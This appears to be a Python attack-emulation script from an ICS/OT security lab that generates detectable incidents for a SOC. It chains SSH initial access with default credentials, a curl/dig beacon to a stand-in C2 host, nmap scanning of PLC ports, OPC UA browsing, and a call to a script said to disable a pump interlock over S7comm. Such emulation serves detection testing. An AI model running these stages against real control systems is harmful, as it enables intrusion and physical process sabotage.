# SPDX-License-Identifier: PolyForm-Noncommercial-1.0.0
"""Kaaval attacker — ATT&CK-for-ICS-tagged kill-chain stages.

The attacker is the external adversary. It gains initial access by SSH into the
engineering workstation (ews), then drives every later stage as a command run
*on the ews* over that SSH path, so all malicious traffic crosses the ews eth0
and is captured by the Zeek sidecar. The ews already carries the tooling
(nmap, curl, dig, python-snap7, the OT client scripts under /opt/ot).
"""

from __future__ import annotations

import os
import shlex
import subprocess

EWS_HOST = os.environ.get("EWS_HOST", "ews")
EWS_USER = os.environ.get("EWS_USER", "engineer")
EWS_PASS = os.environ.get("EWS_PASS", "engineer")
C2_HOST = os.environ.get("C2_HOST", "c2")
BEACON_COUNT = int(os.environ.get("BEACON_COUNT", "4"))
BEACON_INTERVAL = os.environ.get("BEACON_INTERVAL", "1")

# Stage table — order matters; each entry is (name, technique_ids, description).
STAGES = [
    ("initial_access", ["T0822"], "External Remote Services — SSH login to the ews from an external host"),
    ("c2_beacon", ["T0869"], "Standard Application Layer Protocol — periodic TLS + DNS beacon ews->c2"),
    ("discovery", ["T0846"], "Remote System Discovery — scan the OT subnet from the ews"),
    ("boundary_recon", ["T0888"], "Remote System Information Discovery — browse the OPC UA gateway address space"),
    ("impact", ["T0855", "T0836", "T0831"], "Unauthorized Command Message / Modify Parameter / Manipulation of Control — disable interlock and force pump setpoint to max over direct S7comm"),
]
STAGE_NAMES = [s[0] for s in STAGES]
TECHNIQUE_NAMES = {
    "T0822": "External Remote Services",
    "T0869": "Standard Application Layer Protocol",
    "T0846": "Remote System Discovery",
    "T0888": "Remote System Information Discovery",
    "T0855": "Unauthorized Command Message",
    "T0836": "Modify Parameter",
    "T0831": "Manipulation of Control",
}


def _ssh(remote_cmd: str, timeout: int = 60) -> subprocess.CompletedProcess:
    """Run a command on the ews over SSH (this is the attacker's foothold)."""
    cmd = [
        "sshpass", "-p", EWS_PASS,
        "ssh", "-o", "StrictHostKeyChecking=no", "-o", "UserKnownHostsFile=/dev/null",
        "-o", "ConnectTimeout=10",
        f"{EWS_USER}@{EWS_HOST}", remote_cmd,
    ]
    return subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)


def initial_access() -> str:
    cp = _ssh("hostname; id")
    if cp.returncode != 0:
        raise RuntimeError(f"SSH initial access failed: {cp.stderr.strip()}")
    return f"SSH login to {EWS_USER}@{EWS_HOST} ok:\n{cp.stdout.strip()}"


def c2_beacon() -> str:
    # Periodic TLS GET + DNS query to the C2 at a fixed interval (beaconing).
    remote = (
        f"for i in $(seq 1 {BEACON_COUNT}); do "
        f"curl -ks https://{C2_HOST}/ >/dev/null; "
        f"dig +tries=1 +time=2 @{C2_HOST} beacon.kaaval-c2.example A >/dev/null; "
        f"sleep {shlex.quote(str(BEACON_INTERVAL))}; done; echo beaconed {BEACON_COUNT}x"
    )
    cp = _ssh(remote, timeout=60)
    if cp.returncode != 0:
        raise RuntimeError(f"beacon failed: {cp.stderr.strip()}")
    return f"TLS+DNS beacon to {C2_HOST} x{BEACON_COUNT}: {cp.stdout.strip()}"


def discovery() -> str:
    cp = _ssh("nmap -sT -Pn -p 22,102,443,4840 plc gateway 2>/dev/null | grep -E 'Nmap scan|open|closed' | head -n 20")
    if cp.returncode != 0:
        raise RuntimeError(f"scan failed: {cp.stderr.strip()}")
    return f"OT subnet scan:\n{cp.stdout.strip()}"


def boundary_recon() -> str:
    cp = _ssh("python3 /opt/ot/browse_opcua.py 2>/dev/null | tail -n 5", timeout=60)
    if cp.returncode != 0:
        raise RuntimeError(f"opcua browse failed: {cp.stderr.strip()}")
    return f"OPC UA address-space browse:\n{cp.stdout.strip()}"


def impact() -> str:
    cp = _ssh("python3 /opt/ot/attack_plc.py", timeout=60)
    if cp.returncode != 0:
        raise RuntimeError(f"S7 impact failed: {cp.stderr.strip()}")
    return f"Direct S7comm manipulation:\n{cp.stdout.strip()}"


RUNNERS = {
    "initial_access": initial_access,
    "c2_beacon": c2_beacon,
    "discovery": discovery,
    "boundary_recon": boundary_recon,
    "impact": impact,
}

# Named attack TYPES — each a composition of real, detectable stages. Launched as
# its own campaign, each forms a DISTINCT incident with its own technique set,
# domain mix, and severity, so the SOC queue shows genuine variety (not faked).
SCENARIOS = {
    "full_chain":     ["initial_access", "c2_beacon", "discovery", "boundary_recon", "impact"],
    "c2_beaconing":   ["initial_access", "c2_beacon"],
    "ot_recon":       ["initial_access", "discovery", "boundary_recon"],
    "ot_tamper":      ["initial_access", "impact"],
}
SCENARIO_META = {
    "full_chain":   {"label": "Full IT→OT chain",   "summary": "Foothold → C2 → recon → unauthorized S7 manipulation (cross-domain, critical)"},
    "c2_beaconing": {"label": "C2 beaconing",       "summary": "Foothold + periodic TLS/DNS beacon to an external host (IT command-and-control)"},
    "ot_recon":     {"label": "OT reconnaissance",  "summary": "Foothold + OT subnet scan + OPC UA address-space browse (cross-domain discovery)"},
    "ot_tamper":    {"label": "OT manipulation",    "summary": "Foothold + direct unauthorized S7comm write to the PLC (process impact, critical)"},
}
